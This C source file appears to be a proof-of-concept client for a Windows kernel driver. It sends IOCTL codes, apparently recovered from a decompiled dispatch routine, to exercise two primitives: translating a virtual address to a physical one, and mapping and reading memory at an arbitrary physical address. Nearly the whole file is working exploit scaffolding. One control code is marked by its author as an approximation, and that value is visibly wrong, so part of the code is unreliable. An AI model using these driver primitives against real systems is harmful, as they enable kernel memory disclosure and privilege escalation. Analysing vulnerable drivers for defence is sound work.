#include <windows.h>
#include <winioctl.h>
#include <stdio.h>

// Define the device symbolic link (adjust based on the driver's actual symlink string)
#define DRIVER_DEVICE_NAME "\\\\.\\TargetDevice"

// Control codes extracted from the switch statement in sub_1400011A4
#define IOCTL_GET_BUFFER_A       0xA9000000
#define IOCTL_GET_CONFIG         0xA9000004
#define IOCTL_GET_BUFFER_B       0xA9000008
#define IOCTL_MAP_AND_READ       0xA900000C
#define IOCTL_GET_PHYSICAL_ADDR  0xA9000034
#define IOCTL_CHECK_STATUS_1     0xCBA90000
#define IOCTL_CHECK_STATUS_2     0x9B8A0024 // Approximate value for -878103956

int main() {
    printf("[*] Opening handle to driver...\n");

    HANDLE hDevice = CreateFileA(
        DRIVER_DEVICE_NAME,
        GENERIC_READ | GENERIC_WRITE,
        0,
        NULL,
        OPEN_EXISTING,
        FILE_ATTRIBUTE_NORMAL,
        NULL
    );

    if (hDevice == INVALID_HANDLE_VALUE) {
        printf("[-] Failed to open device handle. Error: %lu\n", GetLastError());
        return 1;
    }

    printf("[+] Successfully opened driver handle!\n");

    DWORD bytesReturned = 0;

    // ==========================================
    // DEMO 1: Virtual-to-Physical Address Translation (0xA9000034)
    // ==========================================
    {
        // The driver checks if input length == 8 and parameters/offsets match.
        // It passes a target pointer via the input buffer structure.
        struct {
            ULONG_PTR TargetVirtualAddress;
            ULONG DummyParam;
        } inputPayload = { 0 };

        // Allocate a local buffer to test translation
        char testBuffer[16] = "HelloKernel";
        inputPayload.TargetVirtualAddress = (ULONG_PTR)testBuffer;

        PHYSICAL_ADDRESS physicalOutput = { 0 };

        printf("[*] Sending IOCTL_GET_PHYSICAL_ADDR for address: 0x%p...\n", (void*)inputPayload.TargetVirtualAddress);

        BOOL success = DeviceIoControl(
            hDevice,
            IOCTL_GET_PHYSICAL_ADDR,
            &inputPayload,
            sizeof(inputPayload),
            &physicalOutput,
            sizeof(physicalOutput),
            &bytesReturned,
            NULL
        );

        if (success) {
            printf("[+] Successfully resolved physical address! Physical QuadPart: 0x%llX\n", physicalOutput.QuadPart);
        } else {
            printf("[-] IOCTL_GET_PHYSICAL_ADDR failed. Error: %lu\n", GetLastError());
        }
    }

    // ==========================================
    // DEMO 2: Map and Read Memory Primitive (0xA900000C)
    // ==========================================
    {
        // The driver expects v10 (parameters[4]) == 8 and checks length (parameters[2])
        struct {
            ULONG_PTR SourceAddress;
            ULONG ExtraFlags;
        } mapPayload = { 0 };

        // Example target source pointer (in a real scenario, this could be a hardware or mapped pointer)
        mapPayload.SourceAddress = 0xFFE00000; 
        
        char outputBuffer[256] = { 0 };
        DWORD readLength = sizeof(outputBuffer);

        printf("[*] Sending IOCTL_MAP_AND_READ to read memory at 0x%p...\n", (void*)mapPayload.SourceAddress);

        BOOL success = DeviceIoControl(
            hDevice,
            IOCTL_MAP_AND_READ,
            &mapPayload,
            sizeof(mapPayload),
            outputBuffer,
            readLength,
            &bytesReturned,
            NULL
        );

        if (success) {
            printf("[+] Read %lu bytes successfully via driver mapping!\n", bytesReturned);
        } else {
            printf("[-] IOCTL_MAP_AND_READ failed. Error: %lu\n", GetLastError());
        }
    }

    CloseHandle(hDevice);
    printf("[*] Closed driver handle. Done.\n");
    return 0;
}